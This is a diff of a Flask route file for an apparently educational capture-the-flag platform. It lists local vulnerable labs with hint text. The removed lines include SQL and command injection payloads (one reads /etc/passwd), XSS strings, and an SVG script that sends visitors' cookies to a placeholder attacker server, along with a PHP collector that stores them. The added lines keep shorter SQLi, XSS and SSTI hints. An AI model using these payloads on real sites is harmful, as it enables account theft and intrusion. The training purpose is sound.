@@ -1,72 +1,30 @@
-"""Основной Blueprint: главная, дашборд, приём флагов."""
-
 from flask import Blueprint, render_template, request, jsonify
 from flask_login import login_required, current_user
+import os
 
 from .models import FlagFound
 from . import db
 from .utils import lookup_flag, total_flags
-from flask import render_template
-
 
 bp = Blueprint("main", __name__)
+
+# Автоматическое подключение CTF-сервисов из services/
+BASE_PORT = 9000
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+SERVICES_DIR = os.path.join(BASE_DIR, "services")
 
 LABS_INFO = [
     {
         "name": "dvwa",
-    "description": "Damn Vulnerable Web Application — учебный сервис с уязвимостями.",
-    "url": "http://localhost:8080",
-    "port": 8080,
-    "instruction": """
-        <p><strong>DVWA Security</strong><br>Уровень: low</p>
-
-        <h5>1. Раздел: SQL Injection</h5>
-        <ul>
-            <li>Введи: <code>1' OR '1'='1</code><br>Вывод: список всех пользователей из БД</li>
-            <li>Введи: <code>' UNION SELECT user, password FROM users -- </code><br>Вывод: извлечение хешей всех паролей</li>
-            <li>Расшифруй пароли через: CrackStation, MD5Decrypt, HashKiller</li>
-        </ul>
-
-        <h5>2. Раздел: Command Injection</h5>
-        <ul>
-            <li>Введи: <code>8.8.8.8; uname -a</code><br>Вывод: Имя пользователя ОС</li>
-            <li>Введи: <code>1 | ls -l</code><br>Вывод: Список файлов и прав</li>
-            <li>Введи: <code>1 | uname -a & pwd & ps</code><br>Вывод: Информация об ОС и местоположении</li>
-            <li>Введи: <code>1 | cat /etc/passwd</code><br>Вывод: Логины из системы</li>
-        </ul>
-
-        <h5>3. Раздел: XSS (DOM)</h5>
-        <ul>
-            <li>Выбери язык, затем в адресной строке замени параметр на: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
-            <li>Вывод: Исполнение вредоносного кода</li>
-        </ul>
-
-        <h5>4. Раздел: File Upload</h5>
-        <ul>
-            <li>Создай файл <code>shell.php</code> с содержимым:</li>
-        </ul>
-
-<pre><code>&lt;!doctype html&gt;
-&lt;html&gt;
-  &lt;head&gt;
-    &lt;title&gt;Page Title&lt;/title&gt;
-    &lt;meta charset="UTF-8"&gt;
-    &lt;meta name="viewport" content="initial-scale=1.0"&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;center&gt;Shell Executed&lt;/center&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-
-        <ul>
-            <li>Загрузи файл через уязвимую форму загрузки</li>
-            <li>Перейди по адресу: <code>http://localhost:8080/hackable/uploads/shell.php</code></li>
-            <li>Вывод: Shell был выполнен на сервере</li>
-            <li>Для инструкций к более высокой сложности воспользуйтесь ссылкой:</li>
-            <li>https://timcore.ru/2021/05/11/41-ujazvimost-dvwa-sql-injection-blind-uroven-low/</li>
-        </ul>
-            
+        "description": "Damn Vulnerable Web Application — учебный сервис с уязвимостями.",
+        "url": "http://localhost:8081",
+        "port": 8081,
+        "instruction": """
+            <p>DVWA — это учебный сервис для практики веб-уязвимостей.</p>
+            <ul>
+              <li>Вход: admin/password</li>
+              <li>Цель: найти флаги, используя SQLi, XSS и др.</li>
+            </ul>
         """,
     },
     {
@@ -82,83 +40,134 @@ LABS_INFO = [
             </ul>
         """,
     },
-
     {
         "name": "wordpress:5.0",
-    "description": "WordPress 5.0 — платформа с уязвимостью загрузки SVG и XSS через редактор Gutenberg.",
-    "url": "http://localhost:8085",
-    "port": 8085,
-    "instruction": """
-        <h5>1. RCE через Gutenberg (CVE-2019-6977)</h5>
-        <p><strong>Суть:</strong> Возможность загрузки вредоносных SVG-файлов через редактор записей.</p>
-        <ul>
-            <li>Войдите в систему как <strong>администратор</strong>.</li>
-            <li>Перейдите в меню: <em>Записи → Добавить новую</em></li>
-            <li>Вставьте следующий SVG-код в заголовок поста:</li>
-        </ul>
-
-<pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"&gt;&lt;/svg&gt;
-</code></pre>
-
-        <ul>
-            <li>Опубликуйте пост.</li>
-            <li>При открытии страницы выполнится XSS-скрипт.</li>
-        </ul>
-
-        <h5>2. Кража cookies через SVG</h5>
-        <p><strong>Сценарий атаки:</strong> Вредоносный SVG собирает cookies и отправляет их злоумышленнику.</p>
-
-        <ul>
-            <li>Войдите как администратор и создайте новую запись.</li>
-            <li>Вставьте следующий код в заголовок:</li>
-        </ul>
-
-<pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
-  &lt;script&gt;
-    const cookies = document.cookie;
-    const url = window.location.href;
-    const data = new FormData();
-    data.append('cookies', cookies);
-    data.append('url', url);
-
-    fetch('https://ваш-сервер.com/steal', {
-      method: 'POST',
-      body: data,
-      mode: 'no-cors'
-    }).then(() =&gt; {
-      alert('Ошибка загрузки изображения!');
-    });
-  &lt;/script&gt;
-  &lt;rect width="100%" height="100%" fill="white"/&gt;
-&lt;/svg&gt;
-</code></pre>
-
-        <p>На вашем сервере создайте файл <code>steal.php</code> для приёма данных:</p>
-
-<pre><code>&lt;?php
-$data = [
-    'ip' =&gt; $_SERVER['REMOTE_ADDR'],
-    'time' =&gt; date('Y-m-d H:i:s'),
-    'cookies' =&gt; $_POST['cookies'],
-    'url' =&gt; $_POST['url']
-];
-file_put_contents('stolen.txt', print_r($data, true), FILE_APPEND);
-?&gt;
-</code></pre>
-
-        <ul>
-            <li>После публикации поста при открытии произойдёт передача куков и URL на внешний сервер.</li>
-            <li>Пользователю отобразится ложное сообщение об ошибке.</li>
-        </ul>
+        "description": "",
+        "url": "http://localhost:8080",
+        "port": 8080,
+        "instruction": """
+            <p>bwapp</p>
+            <ul>
+              <li>Вход: нет обязательной регистрации</li>
+              <li>Цель: найти и сдать флаги через форму.</li>
+            </ul>
         """,
     },
+    {
+        "name": "Reflective-xss-cookie-steal-ctf",
+        "description": "Рефлексивная XSS-уязвимость, крадущая cookie.",
+        "instruction": """
+                <p>В этом задании реализована рефлексивная XSS-уязвимость.</p>
+                <ul>
+                  <li>Передавайте имя в URL через параметр <code>?name=</code>.</li>
+                  <li>Попробуйте вставить: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                  <li>Задача: отобразить флаг на странице через внедрение JavaScript.</li>
+                </ul>
+            """,
+        "url": "http://localhost:9000",
+        "port": 9000
+    },
+    {
+        "name": "cors-exploit-ctf",
+        "description": "Уязвимость CORS и кража данных через межсайтовые запросы.",
+        "instruction": """
+                <p>Данный сервис демонстрирует опасность неправильной настройки CORS.</p>
+                <ul>
+                  <li>Создайте HTML-страницу, которая отправляет <code>fetch()</code> POST-запрос на <code>/steal</code>.</li>
+                  <li>В теле запроса передайте cookie или другие приватные данные.</li>
+                  <li>Флаг будет передан в этих данных</li>
+                </ul>
+            """,
+        "url": "http://localhost:9001",
+        "port": 9001
+    },
+    {
+        "name": "sqli_ctf",
+        "description": "SQL-инъекция на странице входа.",
+        "instruction": """
+                <p>На странице входа реализована уязвимость SQL-инъекции.</p>
+                <ul>
+                  <li>Попробуйте ввести в поле логина: <code>' OR 1=1 --</code></li>
+                  <li>Пароль можно оставить пустым или любой.</li>
+                  <li>После успешной инъекции вы попадёте на страницу с флагом.</li>
+                </ul>
+            """,
+        "url": "http://localhost:9002",
+        "port": 9002
+    },
+    {
+        "name": "ss_ctf",
+        "description": "Доступ к файлам через предсказуемые URL.",
+        "instruction": """
+                <p>Сервис предоставляет доступ к файлам по пути в URL.</p>
+                <ul>
+                  <li>Попробуйте открыть: <code>/challenge/folder/flag.txt</code></li>
+                  <li>Или переберите директории вручную.</li>
+                  <li>Флаг хранится в одном из текстовых файлов.</li>
+                </ul>
+            """,
+        "url": "http://localhost:9003",
+        "port": 9003
+    },
+    {
+        "name": "ssti-flask-ctf",
+        "description": "Уязвимость SSTI в шаблонизаторе Jinja2.",
+        "instruction": """
+                <p>На сайте используется Jinja-шаблонизация с прямым вводом данных.</p>
+                <ul>
+                  <li>Попробуйте вставить шаблонный код: <code>{{7*7}}</code></li>
+                  <li>Цель: выполнить SSTI (Server Side Template Injection) и получить флаг</li>
+                  <li>Флаг находится в переменной окружения или шаблоне</li>
+                </ul>
+            """,
+        "url": "http://localhost:9004",
+        "port": 9004
+    },
+    {
+        "name": "vn-break-fort-ctf",
+        "description": "Скрытые маршруты и задания на внимательность.",
+        "instruction": """
+                <p>Вам предстоит пройти по страницам сайта в поисках подсказок.</p>
+                <ul>
+                  <li>Ищите скрытые ссылки, элементы, закодированные строки.</li>
+                  <li>Флаг спрятан в одном из финальных шагов цепочки переходов.</li>
+                  <li>Можно использовать инструменты разработчика для анализа DOM.</li>
+                </ul>
+            """,
+        "url": "http://localhost:9005",
+        "port": 9005
+    },
+    {
+        "name": "web-treasure-hunt-ctf",
+        "description": "Пошаговая охота за флагом в веб-интерфейсе.",
+        "instruction": """
+                <p>Вам предстоит пройти квест из нескольких страниц, чтобы найти флаг.</p>
+                <ul>
+                  <li>Переходите по страницам, находите ключи, решайте загадки.</li>
+                  <li>Флаг будет выдан на финальной странице цепочки.</li>
+                </ul>
+            """,
+        "url": "http://localhost:9006",
+        "port": 9006
+    },
 
-    # Добавь остальные сервисы по аналогии...
+
 ]
-@bp.route("/videos")
-@login_required  # если нужна авторизация, или убери если нет
-def videos():
-    return render_template("videos.html")
+
+# Автоматически добавляем кастомные CTF-сервисы из app/services
+# for idx, dirname in enumerate(sorted(os.listdir(SERVICES_DIR))):
+#     full_path = os.path.join(SERVICES_DIR, dirname)
+#     if not os.path.isdir(full_path):
+#         continue
+#     port = BASE_PORT + idx
+#     LABS_INFO.append({
+#         "name": dirname,
+#         "description": f"CTF-сервис {dirname}",
+#         "url": f"http://localhost:{port}",
+#         "port": port,
+#         "instruction": f"<p>CTF {dirname} — autogenerated.</p>",
+#     })
+
 
 @bp.route("/quests")
 @login_required
@@ -169,19 +178,18 @@ def quests():
 @login_required
 def instructions():
     return render_template("instructions.html", labs=LABS_INFO)
+
 @bp.route("/")
 def index():
     return render_template("index.html")
-
 
 @bp.route("/dashboard")
 @login_required
 def dashboard():
     flags = current_user.flags
     progress = current_user.progress(total_flags())
-    total=total_flags()
-    return render_template("dashboard.html", flags=flags, progress=progress,total_flags=total)
-
+    total = total_flags()
+    return render_template("dashboard.html", flags=flags, progress=progress, total_flags=total)
 
 @bp.route("/submit_flag", methods=["POST"])
 @login_required
@@ -194,7 +202,6 @@ def submit_flag():
     if not found:
         return jsonify(status="error", message="Неверный флаг"), 400
 
-    # Проверяем, сдавался ли ранее
     if FlagFound.query.filter_by(user_id=current_user.id, flag=flag_text).first():
         return jsonify(status="error", message="Уже засчитан"), 400
 
